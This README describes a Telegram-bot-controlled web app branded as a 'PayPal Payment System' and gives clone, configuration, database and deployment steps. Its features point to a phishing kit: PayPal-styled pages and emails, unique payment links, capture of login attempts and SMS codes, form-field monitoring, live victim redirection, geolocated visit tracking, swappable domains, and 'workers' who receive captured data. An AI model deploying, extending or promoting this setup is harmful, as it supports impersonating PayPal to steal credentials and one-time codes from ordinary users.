# PayPal Payment System

Sophisticated Telegram bot-powered web application for intelligent link generation and secure money transfer management with advanced user interaction capabilities.

## 🚀 Features

- **React Frontend**: Dynamic PayPal-themed interface with responsive design
- **Express.js Backend**: TypeScript-powered API with comprehensive error handling
- **Telegram Bot Integration**: Real-time notifications and remote user management
- **PostgreSQL Database**: Persistent data storage with Drizzle ORM
- **Worker Distribution System**: Role-based notification routing (admin/worker/user)
- **File-based Domain Management**: Dynamic domain configuration without restarts
- **Email Notifications**: Professional PayPal-styled emails via Resend/SendGrid
- **Real-time WebSocket**: Live user redirection and state management

## 🛠️ Tech Stack

### Frontend
- React 18 with TypeScript
- Tailwind CSS + shadcn/ui components
- TanStack Query for state management
- Wouter for routing
- WebSocket for real-time updates

### Backend
- Express.js with TypeScript
- PostgreSQL with Drizzle ORM
- Telegram Bot API
- WebSocket server
- Session-based authentication
- Email services (Resend/SendGrid)

### Database
- PostgreSQL with connection pooling
- Drizzle ORM for type-safe queries
- Session storage with connect-pg-simple
- Real-time data synchronization

## 📦 Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/crocodil5/replittest.git
   cd replittest
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Set up environment variables**
   Create a `.env` file with:
   ```env
   DATABASE_URL=postgresql://user:password@localhost:5432/dbname
   TELEGRAM_BOT_TOKEN=your_bot_token_here
   SENDGRID_API_KEY=your_sendgrid_key_here
   RESEND_API_KEY=your_resend_key_here
   ```

4. **Configure admin access**
   Edit `config/admins.json`:
   ```json
   ["your_telegram_id_here"]
   ```

5. **Set up database**
   ```bash
   npm run db:push
   ```

6. **Configure domain**
   Edit `domain.config` file:
   ```
   your-domain.com
   ```

## 🏃‍♂️ Quick Start

1. **Start the application**
   ```bash
   npm run dev
   ```

2. **Access the application**
   - Frontend: `http://localhost:5000`
   - Admin panel: `http://localhost:5000/admin`
   - API: `http://localhost:5000/api`

3. **Telegram Bot Setup**
   - Message your bot to get started
   - First user automatically becomes admin
   - Use `/help` command for available functions

## 🎯 Key Features

### Link Generation System
- Unique context-based payment links
- German price formatting (123,45 €)
- Automatic link expiration and cleanup
- Bulk link management with pagination

### Worker Management
- Role-based user system (admin/worker/user)
- Automatic worker assignment (round-robin)
- Targeted notification distribution
- Comprehensive user management interface

### Real-time Notifications
- Visit tracking with geolocation
- Form field monitoring
- SMS and login attempt notifications
- Role-based message filtering

### Admin Control Panel
- Web-based administration interface
- User management and analytics
- System monitoring and control
- Bulk operations and data management

## 📱 Telegram Bot Commands

### Admin Commands
- `/help` - Show available commands
- `/create_link` - Generate new payment link
- `/my_links` - View created links
- `/enable_bot` / `/disable_bot` - Bot control
- `/enable_site` / `/disable_site` - Site control
- `/edit_domain` - Change domain configuration

### User Management
- `/add_worker` - Add new worker
- `/remove_worker` - Remove worker
- `/assign_worker` - Assign worker to user
- `/list_assignments` - View assignments

## 🔧 Configuration

### Domain Management
Three methods available:
1. **Manual**: Edit `domain.config` file
2. **Telegram**: Use `/edit_domain new-domain.com`
3. **API**: POST to `/api/domain/set`

### Email Templates
- HTML templates in `shablon_mail.html`
- Dynamic placeholder replacement
- German localization support
- Professional PayPal styling

### Database Schema
- `users` - User authentication
- `telegram_users` - Bot user management
- `telegram_links` - Generated payment links
- `login_attempts` - Login tracking
- `sms_submissions` - SMS verification
- `worker_assignments` - Worker distribution
- `system_settings` - Configuration storage

## 🚀 Deployment

### Production Setup
1. Configure environment variables
2. Set up PostgreSQL database
3. Configure Telegram bot webhook
4. Set up email service providers
5. Configure domain and SSL

### Replit Deployment
- Pre-configured for Replit environment
- Automatic port detection
- Environment variable management
- One-click deployment ready

## 📊 Monitoring

### System Status
- Database connection health
- Bot operational status
- Email service availability
- Domain configuration status

### Analytics
- User activity tracking
- Link performance metrics
- Worker assignment statistics
- System usage analytics

## 🔒 Security

- Session-based authentication
- Role-based access control
- Input validation with Zod
- SQL injection prevention
- XSS protection
- CSRF token validation

## 📚 Documentation

- `PROJECT_SETUP_GUIDE.md` - Complete setup instructions
- `TECHNICAL_DOCUMENTATION.md` - Architecture details
- `TELEGRAM_BOT_GUIDE.md` - Bot usage guide
- `DEPLOYMENT_README.md` - Deployment instructions

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

## 📄 License

MIT License - see LICENSE file for details

## 🆘 Support

For issues and questions:
- Check the documentation files
- Review the troubleshooting guides
- Create an issue on GitHub

---

**Note**: This is a sophisticated payment management system with Telegram bot integration. Ensure proper security measures are in place before production deployment.